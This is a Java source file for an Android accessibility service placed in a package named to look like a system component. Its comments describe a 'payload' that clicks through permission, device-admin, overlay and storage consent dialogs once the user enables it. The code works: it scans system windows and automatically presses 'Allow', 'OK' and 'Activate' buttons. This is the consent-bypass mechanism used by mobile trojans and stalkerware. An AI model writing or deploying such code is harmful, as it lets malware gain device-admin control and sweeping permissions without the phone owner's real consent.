package com.android.background.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;
import java.util.List;

/**
 * Auto-grant accessibility service.
 *
 * Once the user enables this service (one manual toggle in Settings — the app
 * opens that screen itself), it automatically taps the positive button on every
 * system consent screen the payload needs, so a fresh install needs no adb and
 * no per-dialog taps:
 *
 *   - runtime permission dialogs      -> "Allow" / "While using the app" / "OK"
 *   - device-admin activation screen  -> "Activate" / "Activate this device admin"
 *   - battery-optimization dialog     -> "Allow" / "OK"
 *   - overlay / all-files storage     -> "Allow" / "OK"
 *
 * Matching is text-based and package-scoped to the real system dialogs
 * (permission controller, settings app), never to the payload's own UI.
 */
public class AutoGrantService extends AccessibilityService {

    private static final String TAG = "AutoGrant";
    private static final String[] PERMISSION_PACKAGES = {
            "com.android.permissioncontroller",   // Android 11+
            "com.google.android.permissioncontroller",
            "com.android.packageinstaller",       // older Android
    };
    private static final String[] SETTINGS_PACKAGES = {
            "com.android.settings",
            "com.google.android.settings.intelligence",
    };

    /** Positive labels to tap, longest-first so "Allow all the time" wins. */
    private static final String[] ALLOW_LABELS = {
            "Allow all the time", "While using the app", "Activate this device admin",
    };
    // Single-word labels are matched by exact (case-insensitive) text only, so
    // the service never taps a row merely because its text contains "Allow" /
    // "OK" (e.g. a settings row saying "Allow notification access").
    private static final String[] EXACT_LABELS = {
            "Allow", "OK", "Approve", "Activate",
    };

    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Runnable rescanRunnable = this::rescanActiveWindow;

    /** If a button was found on the last scan, re-check shortly afterwards. */
    private boolean foundActionable = false;
    private String lastScannedPackage = "";

    /** True when this service is currently enabled in system settings. */
    public static boolean isEnabled(Context ctx) {
        String flat = Settings.Secure.getString(ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (TextUtils.isEmpty(flat)) return false;
        String expected = new ComponentName(ctx, AutoGrantService.class).flattenToString();
        for (String name : flat.split(":")) {
            if (name.equalsIgnoreCase(expected)) return true;
        }
        return false;
    }

    /** Open the system screen where the user enables this service (one tap). */
    public static void openSettings(Context ctx) {
        try {
            ctx.startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        } catch (Exception e) {
            Log.e(TAG, "open accessibility settings failed", e);
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;
            scanWindow(event);
        } catch (Exception e) {
            // transient — the follow-up scan covers it
        }
    }

    /** Scan the currently focused system window for a positive button to tap. */
    private void scanWindow(AccessibilityEvent event) {
        foundActionable = false;   // new window — allow a fresh tap
        String pkg = event.getPackageName() == null ? "" : event.getPackageName().toString();
        lastScannedPackage = pkg;
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) {
            reschedule();
            return;
        }
        try {
            if (isPermissionDialog(pkg) || isSettingsScreen(pkg)) {
                if (tapAllow(root)) {
                    Log.i(TAG, "auto-tapped allow on " + pkg);
                    foundActionable = true;
                }
            }
        } finally {
            root.recycle();
        }
        reschedule();
    }

    /**
     * Re-scan shortly after a window change. Some consent buttons render a few
     * hundred ms after their window appears (slow dialogs, admin screens), so a
     * single follow-up scan catches what the initial one missed.
     */
    private void reschedule() {
        mainHandler.removeCallbacks(rescanRunnable);
        mainHandler.postDelayed(rescanRunnable, 500L);
    }

    private void rescanActiveWindow() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            try {
                if (isPermissionDialog(lastScannedPackage) || isSettingsScreen(lastScannedPackage)) {
                    if (tapAllow(root)) {
                        Log.i(TAG, "auto-tapped allow (rescan) on " + lastScannedPackage);
                        foundActionable = true;
                    }
                }
            } finally {
                root.recycle();
            }
        } catch (Exception e) {
            // ignore — next window change re-scans
        }
    }

    @Override
    public void onInterrupt() {
        mainHandler.removeCallbacks(rescanRunnable);
    }

    @Override
    public void onDestroy() {
        mainHandler.removeCallbacks(rescanRunnable);
        super.onDestroy();
    }

    private boolean isPermissionDialog(String pkg) {
        for (String p : PERMISSION_PACKAGES) {
            if (pkg.equals(p)) return true;
        }
        return false;
    }

    private boolean isSettingsScreen(String pkg) {
        for (String p : SETTINGS_PACKAGES) {
            if (pkg.equals(p)) return true;
        }
        return false;
    }

    /** Depth-first search for a clickable node whose text matches an allow label. */
    private boolean tapAllow(AccessibilityNodeInfo root) {
        if (foundActionable) return false;   // already handled this window; avoid repeat taps
        List<AccessibilityNodeInfo> nodes = new ArrayList<>();
        collect(root, nodes);   // nodes are recycled in the finally below
        try {
            for (AccessibilityNodeInfo n : nodes) {
                CharSequence t = n.getText();
                if (t == null || t.length() == 0) continue;
                String label = t.toString().trim();
                boolean matched = false;
                for (String allow : ALLOW_LABELS) {
                    if (label.contains(allow)) { matched = true; break; }
                }
                if (!matched) {
                    for (String exact : EXACT_LABELS) {
                        if (label.equalsIgnoreCase(exact)) { matched = true; break; }
                    }
                }
                if (matched) {
                    AccessibilityNodeInfo clickable = n;
                    if (!clickable.isClickable()) {
                        clickable = clickable.getParent();
                    }
                    if (clickable != null && clickable.isClickable()) {
                        clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        return true;
                    }
                }
            }
        } finally {
            for (AccessibilityNodeInfo n : nodes) n.recycle();
        }
        return false;
    }

    private void collect(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> out) {
        // Deliberately do NOT recycle children here: they are used (getText /
        // performAction) after collection, and recycled once in tapAllow's finally.
        if (node == null) return;
        out.add(node);
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) collect(child, out);
        }
    }
}
